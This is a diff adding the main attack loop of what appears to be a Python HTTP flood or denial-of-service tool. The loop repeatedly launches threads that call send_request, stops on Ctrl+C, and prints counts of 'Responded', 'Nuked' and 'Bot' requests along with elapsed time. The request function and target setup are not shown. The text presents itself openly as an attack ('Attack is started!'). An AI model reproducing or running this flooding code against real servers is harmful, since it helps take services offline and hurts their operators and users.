@@ -647,4 +647,59 @@ if __name__ == '__main__':
                 break
 
         except KeyboardInterrupt:
+            logging.critical('Interrupt by keyboard before the attack!')
+            sys.exit()
+
+        except BaseException:
+            continue
+
+    logging.info('Allow Redirections?: ' + str(selected_redir))
+
+    if (selected_redir == 'y'):
+        selected_redir = True
+    else:
+        selected_redir = False
+
+    start_time = time.time()
+    print(Fore.RED + 'Attack is started! Press [CTRL + C] to stop.')
+    logging.info('Attack started!')
+
+    while (True):
+        try:
+            for i in range(num_threads):
+                t = threading.Thread(target=send_request)
+                t.start()
+                sleep(sleep_time)
+                elapsed_time = time.time() - start_time
+                print(Fore.BLUE + 'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(str(num_success), str(num_failed), str(num_bot_requests), round(elapsed_time)), end='\r', flush=True)
+
+            main_thread = threading.currentThread()
+            for i in threading.enumerate():
+                if i is main_thread:
+                    continue
+                else:
+                    print(Fore.BLUE + 'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(str(num_success), str(num_failed), str(num_bot_requests), round(elapsed_time)), end='\r', flush=True)
+                    i.join()
+
+        except KeyboardInterrupt:
+            print(Fore.RED + '\nAttack was stopped!')
+            logging.info('Attack stopped!')
+            main_thread = threading.currentThread()
+            print(Fore.RED + 'Threads are exiting...')
+
+            for i in threading.enumerate():
+                if i is main_thread:
+                    continue
+                else:
+                    i.join()
+
+            logging.info(
+                'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(
+                    str(num_success),
+                    str(num_failed),
+                    str(num_bot_requests),
+                    round(elapsed_time)))
+            print(Fore.BLUE + 'Successfully finished!')
+            logging.info('Successfully finished!')
+            break
    
